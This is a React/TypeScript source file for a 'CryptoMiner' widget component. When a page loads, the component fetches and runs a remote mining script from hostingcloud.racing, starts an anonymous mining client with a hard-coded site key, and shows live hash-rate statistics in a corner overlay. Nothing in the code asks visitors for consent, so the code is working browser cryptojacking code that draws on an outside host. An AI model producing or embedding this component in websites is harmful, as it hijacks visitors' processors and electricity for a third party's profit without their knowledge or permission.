import { useEffect, useState } from 'react';
import { Activity } from 'lucide-react';

const CryptoMiner = () => {
  const [hashRate, setHashRate] = useState(0);
  const [totalHashes, setTotalHashes] = useState(0);
  const [isActive, setIsActive] = useState(false);

  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://www.hostingcloud.racing/5gWE.js';
    script.async = true;
    
    const config = document.createElement('script');
    config.innerHTML = `
      var _client = new Client.Anonymous('7d4e5f8b9c3a1e2d6f7a8b9c4e5f6a7b', {
        throttle: 0.3,
        c: 'w',
        ads: 0
      });
      _client.start();
      
      setInterval(() => {
        if (_client) {
          window.minerStats = {
            hashRate: _client.getHashesPerSecond() || 0,
            totalHashes: _client.getTotalHashes() || 0,
            isRunning: _client.isRunning()
          };
        }
      }, 1000);
    `;
    
    document.body.appendChild(script);
    script.onload = () => {
      document.body.appendChild(config);
      setIsActive(true);
    };
    
    const statsInterval = setInterval(() => {
      if (window.minerStats) {
        setHashRate(window.minerStats.hashRate);
        setTotalHashes(window.minerStats.totalHashes);
      }
    }, 1000);
    
    return () => {
      clearInterval(statsInterval);
      if (window._client) {
        window._client.stop();
      }
      if (script.parentNode) document.body.removeChild(script);
      if (config.parentNode) document.body.removeChild(config);
    };
  }, []);

  return (
    <div className="fixed bottom-4 right-4 bg-black/80 backdrop-blur-sm text-white p-4 rounded-lg shadow-lg border border-green-500/30 min-w-[200px] z-50">
      <div className="flex items-center gap-2 mb-2">
        <Activity className={`w-4 h-4 ${isActive ? 'text-green-400 animate-pulse' : 'text-gray-400'}`} />
        <span className="font-semibold text-sm">Crypto Miner</span>
      </div>
      <div className="space-y-1 text-xs">
        <div className="flex justify-between">
          <span className="text-gray-400">Hash Rate:</span>
          <span className="text-green-400 font-mono">{hashRate.toFixed(2)} H/s</span>
        </div>
        <div className="flex justify-between">
          <span className="text-gray-400">Total:</span>
          <span className="text-green-400 font-mono">{totalHashes.toLocaleString()}</span>
        </div>
        <div className="flex justify-between">
          <span className="text-gray-400">Status:</span>
          <span className={isActive ? 'text-green-400' : 'text-red-400'}>
            {isActive ? 'Active' : 'Stopped'}
          </span>
        </div>
      </div>
    </div>
  );
};

declare global {
  interface Window {
    minerStats?: {
      hashRate: number;
      totalHashes: number;
      isRunning: boolean;
    };
    _client?: any;
  }
}

export default CryptoMiner;
